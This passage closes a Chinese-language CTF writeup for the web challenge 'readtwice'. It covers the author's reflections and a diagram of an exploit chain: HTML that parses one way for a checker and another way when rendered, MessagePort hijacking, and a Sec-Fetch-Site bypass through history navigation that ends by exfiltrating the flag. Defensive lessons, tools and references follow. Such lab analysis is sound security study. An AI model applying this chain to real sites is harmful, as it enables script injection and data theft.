**回答"是不是别的队的 AI 更强"这个问题的实质**：别人用什么工具我既不知道也不必猜；我能回答的是——**同样的公开信息、同样的搜索能力，我的取用策略错了**。如果别的队也用 AI，胜负手大概率在"人知道让 AI 去查什么"：是问"这题怎么解"（答案向），还是问"这两个环境的解析差异有哪些、Chrome 最近加了什么"（机制向+查新）。前者把 AI 当答案机，后者把 AI 当检索与验证引擎——本题的答案恰好藏在后一种用法里。

**"是否真的深度反思"的自检标准（也是给读者的可复用框架）**：一份反思合格，当且仅当它同时通过三条检验——

1. **失效点具体到动作**：能指出"哪一步的哪个动作失效"，而不是笼统的"思路不对"（本文 10.1/10.2：fuzz 否定→封分支、简化实验→泛化、二手转述→未复测）；
2. **每条教训落到"下次哪个动作变"**：教训必须可执行，"下次更仔细"不合格（本文 10.3 六条全部对应具体动作）；
3. **诚实区分可治与不可治**：不把硬限制包装成态度问题（那会催生无效的自我批评），也不把态度问题推给硬限制（那会放过真正的失误）。本节的三层归因就是按这条标准写的。

反过来讲：如果一份反思的结论是"我应该更努力/更聪明"，它是空话；如果它避免承认任何上限，它是表演。本篇两者的位置都标了出来。

### 10.6 一张表总结：卡点 → 根源 → 根治

| 卡点 | 根源 | 根治条目 |
|---|---|---|
| DSD 知道但没连上 | 孤岛知识从未被"检查器在数元素"这个提问激活 | ②机制向提问会自然激活（"什么机制能让元素不被计数？"） |
| DPU 真不知道 | 知识截止 + 没有查新习惯 | ③情报订阅是第一动作 |
| 遍历被误判死刑 | 简化实验泛化 + 二手信息锚定 | ④完整场景原则 + ⑤一手复测原则 |
| 三者共同的封顶错误 | fuzz 否定结果 → "不可能" → 关闭分支 | ①置信度标注 + ⑥重写为"缺哪类机制" |

---


## 第十一章：总结与工具链

### 11.1 攻击链一图流

```text
/create 提交"两副面孔"笔记（DSD 藏身 + DPU 补妆/拖延 + noscript 变形）
   └→ 检查器（JS关）看到：head=[CSP meta] + body=[空div] ✓ 通过
   └→ /sandbox 渲染（JS开）：alt 里的 </noscript> 提前闭合 → 幽灵 script 降生
        → 先于 DPU 空投的 meta CSP 执行 → s.js 苏醒
             └→ 劫持审核页转移来的 MessagePort → 转交攻击者
                  └→ 攻击者喊 "ready" → 审核页自己 POST /complete → approved ✓
攻击入口页 → about:blank；弹窗(helper,同源) → opener.history.back()
   └→ 入口响应 no-store → 回退真正重发 → Sec-Fetch-Site: none（bookmark！）
        └→ 服务器第2次访问回应 302 → /reports/check?rid=X
             └→ none 继承 + 同站 admin Cookie + watchDocument 设 finalized
                  └→ 六锁齐开 → 笔记原文无 CSP 返回 → s.js 顶层再执行
                       └→ 同源 fetch /api/flag → 外传 → pwnsec{1503fc99f750c466}
```

### 11.2 三条主线教训

1. **"检查两次"的安全模型天然危险**：只要检查环境与执行环境存在任何配置差（JS 开关、特性开关、版本），输入就可能长出两副面孔。防御上要么同态检查，要么不给输入变代码的机会；
2. **Fetch Metadata 不是信任边界**：`Sec-Fetch-Site: none` 可以由历史回退合法产生（浏览器亲自发起），也能被任何非浏览器客户端直接伪造——敏感操作必须有独立的随机令牌；
3. **postMessage 转移端口 = 转移信任**：端口通道不认来源只认端口对象，沙箱里的脚本可以把端口转交给任何人。凡依赖端口消息做授权的，必须自带挑战-应答。

### 11.3 我的解题复盘一句话版

我独立完成了：全部端点与状态机分析、19200 例检查器 fuzz、完整 Sec-Fetch 实测矩阵、note 惰性证明、同站端口偷 sid 的旁路（本地 3/3 验证）。我没能完成：独立发现 DSD/DPU/noscript 三件套组合与 bookmark 遍历。败因不是搜索能力或工程能力，而是**一个被过度采信的否定结论关闭了正确分支**（第十章）。官方 writeup 公开后，我在本地一次性复现全链成功——所有前期分析（状态机、矩阵、旁路）都是理解正解的必要地基，缺的只是那把 2026 年 5 月才铸好的钥匙。

### 11.4 工具链

| 工具 | 用途 |
|---|---|
| Docker / docker compose | 题目原版环境复现与插桩 |
| Node.js + puppeteer（容器内 Chromium 152） | bot 行为仿真、双态解析实验、Sec-Fetch 矩阵 |
| Python http.server（ThreadingHTTPServer） | 攻击回调服务器（入口页/helper/s.js/flag 收件） |
| Python requests | /create、/report 流程驱动 |
| curl | 端点行为与响应头验证（Content-Type、Set-Cookie、CSP） |
| 服务端日志插桩（appendFileSync proof.txt） | 六状态位 + Sec-Fetch 头逐请求取证 |
| grep/正则 | 从 /review 响应抠 nonce、日志分析 |
| GitHub writeup 仓库（stack1245/PwnSec-CTF-2026） | 赛后正解来源（本地复现验证后采信） |

### 11.5 参考资料

- 官方解法仓库：`https://github.com/stack1245/PwnSec-CTF-2026/tree/main/web/readtwice`
- Declarative Partial Updates（Chrome 官方博客，2026-05-19）：`https://developer.chrome.com/blog/declarative-partial-updates`
- Declarative Shadow DOM（web.dev）：`https://web.dev/articles/declarative-shadow-dom`
- WICG DPU 提案：`https://github.com/WICG/declarative-partial-updates`
- Firefox bug 1648825（Fetch Metadata 与 history 的历史讨论）：`https://bugzilla.mozilla.org/show_bug.cgi?id=1648825`
- MDN `<template>`（含 shadowrootmode 解析语义）：`https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/template`

---

*Writeup 完。flag：`pwnsec{1503fc99f750c466}`。*

